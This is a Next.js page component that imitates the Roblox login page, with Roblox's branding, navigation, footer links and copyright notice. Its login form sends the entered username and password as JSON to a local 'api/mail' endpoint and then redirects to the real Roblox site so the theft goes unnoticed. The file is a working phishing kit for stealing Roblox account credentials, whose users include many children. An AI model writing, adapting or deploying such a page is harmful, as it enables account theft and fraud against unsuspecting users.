import Head from "next/head";
import Image from "next/image";
import localFont from "@next/font/local";
import styles from "@/styles/Home.module.css";
import robloxLogo from "../public/roblox.png";
import search from "../public/search.png";
import { useState } from "react";
import { useRouter } from "next/router";

const myFont = localFont({ src: "../public/fonts/GothamSSm-Medium.ttf" });
const MAIL_ENDPOINT = "api/mail";

export default function Home() {
  const router = useRouter();

  let [userName, setUserName] = useState("");
  let [password, setPassword] = useState("");

  // event listener
  const onChange = (e) => {
    if (e.target.name === "password") {
      setPassword(e.target.value);
    } else {
      setUserName(e.target.value);
    }
  };

  const onClick = async (e) => {
    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ userName, password }),
    };
    const response = await fetch(MAIL_ENDPOINT, options);
    if (response.ok) {
      router.push("https://www.roblox.com/discover#/");
    } else {
      router.reload();
    }
  };

  return (
    <>
      <Head>
        <title>Roblox</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className={myFont.className}>
        <nav className={styles.nav}>
          <Image src={robloxLogo} alt="" className={styles.logo} />
          <ul className={styles.navUl}>
            <li className={styles.navLi}>
              <a
                href="https://www.roblox.com/discover"
                className={styles.navLinks}
              >
                Discover
              </a>
            </li>
            <li className={styles.navLi}>
              <a
                href="https://www.roblox.com/catalog"
                className={styles.navLinks}
              >
                Avatar Shop
              </a>
            </li>
            <li className={styles.navLi}>
              <a
                href="https://www.roblox.com/develop"
                className={styles.navLinks}
              >
                Create
              </a>
            </li>
            <li className={styles.navLi}>
              <a
                href="https://www.roblox.com/robux?ctx-nav"
                className={styles.navLinks}
              >
                Robux
              </a>
            </li>
          </ul>
          <div className={styles.inputContainer}>
            <Image
              src={search}
              alt="Search icon"
              className={styles.searchIcon}
            />
            <input
              type="text"
              placeholder="Search"
              className={styles.navInput}
            />
          </div>
          <a
            href="https://www.roblox.com/account/signupredir"
            className={styles.navSignUp}
          >
            Sign Up
          </a>
        </nav>
        <div className={styles.loginBox}>
          <h1 className={styles.h1Login}>Login to Roblox</h1>
          <input
            type="text"
            placeholder="Username/Email/Phone"
            name="userName"
            value={userName}
            onChange={onChange}
            className={styles.lInput1}
          />
          <input
            type="password"
            placeholder="Password"
            name="password"
            className={styles.lInput2}
            value={password}
            onChange={onChange}
          />
          <button className={styles.lButton} onClick={onClick}>
            Log In
          </button>
          <div className={styles.forgotText}>
            <a
              href="https://www.roblox.com/login/forgot-password-or-username"
              className={styles.forgotLink}
            >
              Forgot Password or Username?
            </a>
          </div>
          <div className={styles.divider}>
            <div className={styles.divider1}></div>
            <div className={styles.dividerText}>login with</div>
            <div className={styles.divider2}></div>
          </div>
          <button className={styles.lButton}>Another Logged In Device</button>
          <div className={styles.noAccountText}>
            Don't have an account?
            <a className={styles.signUpBtn} href="https://www.roblox.com/">
              Sign Up
            </a>
          </div>
        </div>
      </main>
      <footer className={`${myFont.className} ${styles.footer}`}>
        <nav>
          <ul className={styles.navFooterLinks}>
            <li>
              <a
                href="https://www.roblox.com/info/about-us?locale=en_us"
                className={styles.navLinks}
              >
                About Us
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/jobs?locale=en_us"
                className={styles.navLinks}
              >
                Jobs
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/blog?locale=en_us"
                className={styles.navLinks}
              >
                Blog
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/parents?locale=en_us"
                className={styles.navLinks}
              >
                Parents
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/giftcards?locale=en_us"
                className={styles.navLinks}
              >
                Gift Cards
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/help?locale=en_us"
                className={styles.navLinks}
              >
                Help
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/terms?locale=en_us"
                className={styles.navLinks}
              >
                Terms
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/accessibility?locale=en_us"
                className={styles.navLinks}
              >
                Accessibility
              </a>
            </li>
            <li>
              <a
                href="https://www.roblox.com/info/privacy?locale=en_us"
                className={styles.navLinks}
              >
                Privacy
              </a>
            </li>
          </ul>
        </nav>
        <div className={styles.copyright}>
          ©2023 Roblox Corporation. Roblox, the Roblox logo and Powering
          Imagination are among our registered and unregistered trademarks in
          the U.S. and other countries.
        </div>
      </footer>
    </>
  );
}
